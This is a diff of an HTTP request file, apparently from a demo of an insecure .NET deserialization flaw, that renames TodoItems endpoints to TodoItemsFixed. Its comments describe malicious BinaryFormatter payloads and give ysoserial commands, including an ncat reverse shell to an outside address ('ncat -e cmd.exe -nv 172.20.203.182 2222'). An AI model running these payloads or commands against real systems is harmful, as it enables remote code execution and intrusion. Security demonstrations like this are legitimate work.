@@ -3,11 +3,11 @@
 
 ### list all items
 
-GET https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+GET https://{{hostname}}:{{port}}/api/TodoItemsFixed HTTP/1.1
 
 ### create a new task
 
-POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+POST https://{{hostname}}:{{port}}/api/TodoItemsFixed HTTP/1.1
 content-type: application/json
 
 {
@@ -16,7 +16,7 @@ content-type: application/json
 
 ### update an existing task
 
-PUT https://{{hostname}}:{{port}}/api/TodoItems/0 HTTP/1.1
+PUT https://{{hostname}}:{{port}}/api/TodoItemsFixed/0 HTTP/1.1
 content-type: application/json
 
 {
@@ -27,7 +27,7 @@ content-type: application/json
 
 ### send benign binary data
 
-POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+POST https://{{hostname}}:{{port}}/api/TodoItemsFixed HTTP/1.1
 content-type: application/json
 
 {
@@ -43,7 +43,7 @@ content-type: application/json
 
 ### send malicious binary data to launch calc.exe
 
-POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+POST https://{{hostname}}:{{port}}/api/TodoItemsFixed HTTP/1.1
 content-type: application/json
 
 {
@@ -61,7 +61,7 @@ content-type: application/json
 ### Executes: winget install Insecure.Nmap
 ### Generated using: ysoserial -f BinaryFormatter -g ClaimsPrincipal -o base64 -c "winget install Insecure.Nmap"
 
-POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+POST https://{{hostname}}:{{port}}/api/TodoItemsFixed HTTP/1.1
 content-type: application/json
 
 {
@@ -77,7 +77,7 @@ content-type: application/json
 
 ### Test the fix
 
-POST https://{{hostname}}:{{port}}/api/TodoItemsFixed HTTP/1.1
+POST https://{{hostname}}:{{port}}/api/TodoItemsFixedFixed HTTP/1.1
 content-type: application/json
 
 {
@@ -93,7 +93,7 @@ content-type: application/json
 
 ### send malicious binary data to launch ncat and open reverse shell to 172.30.181.236
 
-POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+POST https://{{hostname}}:{{port}}/api/TodoItemsFixed HTTP/1.1
 content-type: application/json
 
 {
@@ -111,7 +111,7 @@ content-type: application/json
 ### Executes: ncat -e cmd.exe -nv 172.20.203.182 2222
 ### Generated using: ysoserial -f BinaryFormatter -g ClaimsPrincipal -o base64 -c "ncat -e cmd.exe -nv 172.20.203.182 2222"
 
-POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+POST https://{{hostname}}:{{port}}/api/TodoItemsFixed HTTP/1.1
 content-type: application/json
 
 {
@@ -127,7 +127,7 @@ content-type: application/json
 
 ### send malicious binary data to launch ncat and open reverse shell in your environment
 
-POST https://{{hostname}}:{{port}}/api/TodoItems HTTP/1.1
+POST https://{{hostname}}:{{port}}/api/TodoItemsFixed HTTP/1.1
 content-type: application/json
 
 {
